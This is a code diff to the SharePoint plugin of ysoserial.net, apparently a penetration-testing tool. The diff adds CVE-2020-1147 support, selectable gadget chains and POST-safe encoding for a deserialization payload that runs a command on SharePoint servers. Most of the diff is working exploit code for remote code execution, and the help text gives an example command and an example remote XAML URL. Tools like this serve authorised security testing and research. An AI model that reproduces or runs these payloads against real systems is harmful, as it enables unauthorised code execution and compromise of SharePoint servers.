@@ -1,6 +1,7 @@
 ﻿using NDesk.Options;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
 using ysoserial.Generators;
@@ -13,6 +14,7 @@ using ysoserial.Helpers;
  *  This plugin generates payloads that can be used for a few SharePoint vulnerabilities that are related to deserialization.
  *  Please feel free to contribute to this and add your name at the top.
  *  It currently supports:
+ *      CVE-2020-1147: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
  *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
  *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
  **/
@@ -22,13 +24,15 @@ namespace ysoserial.Plugins
     public class SharePointPlugin : IPlugin
     {
         static string cve = "";
+        static string gadget = "TypeConfuseDelegate";
         static string command = "";
         static bool useurl = false;
 
         static OptionSet options = new OptionSet()
             {
-                {"cve=", "the CVE reference: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
-                {"useurl", "to use the XAML url rather than using the direct command", v => useurl = v != null },
+                {"cve=", "the CVE reference: CVE-2020-1147 (result is safe for a POST request), CVE-2019-0604, CVE-2018-8421", v => cve = v },
+                {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
+                {"g|gadget=", "a gadget chain that supports LosFormatter for CVE-2020-1147. Default: TypeConfuseDelegate ", v => gadget = v },
                 {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
             };
 
@@ -117,11 +121,47 @@ namespace ysoserial.Plugins
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = command;
             inputArgs.IsRawCmd = true;
-            inputArgs.Minify = true;
-            inputArgs.UseSimpleType = true;
+            inputArgs.Minify = false; // minimisation of payload is not important here but we can do it if needed!
+            inputArgs.UseSimpleType = false; // minimisation of payload is not important here but we can do it if needed!
 
-            var losFormatterPayload = Encoding.UTF8.GetString((byte[]) new TypeConfuseDelegateGenerator().GenerateWithNoTest("losformatter", inputArgs));
+            string formatter = "losformatter";
+            string losFormatterPayload = "";
             
+            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
+            // Populate list of available gadgets
+            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
+            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();
+
+            if (!generators.Contains(gadget))
+            {
+                Console.WriteLine("Gadget not supported.");
+                System.Environment.Exit(-1);
+            }
+
+            // Instantiate Payload Generator
+            IGenerator generator = null;
+            try
+            {
+                var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget + "Generator");
+                generator = (IGenerator)container.Unwrap();
+            }
+            catch
+            {
+                Console.WriteLine("Gadget not supported!");
+                System.Environment.Exit(-1);
+            }
+
+            // Check Generator supports specified formatter
+            if (generator.IsSupported(formatter))
+            {
+                losFormatterPayload = System.Text.Encoding.ASCII.GetString((byte[])generator.GenerateWithNoTest(formatter, inputArgs));
+            }
+            else
+            {
+                Console.WriteLine("LosFormatter not supported.");
+                System.Environment.Exit(-1);
+            }
+
             string payload = @"<DataSet>
   <xs:schema xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" id=""somedataset"">
     <xs:element name=""somedataset"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
@@ -156,10 +196,9 @@ namespace ysoserial.Plugins
   </diffgr:diffgram>
 </DataSet>";
 
-            
             // minimisation of payload is not important here but we can do it if needed!
 
-            return payload;
+            return payload.Replace("+","%2B").Replace("&","%26"); // POST body safe (minimal url-encoding)
         }
 
         public string CVE_2018_8421()
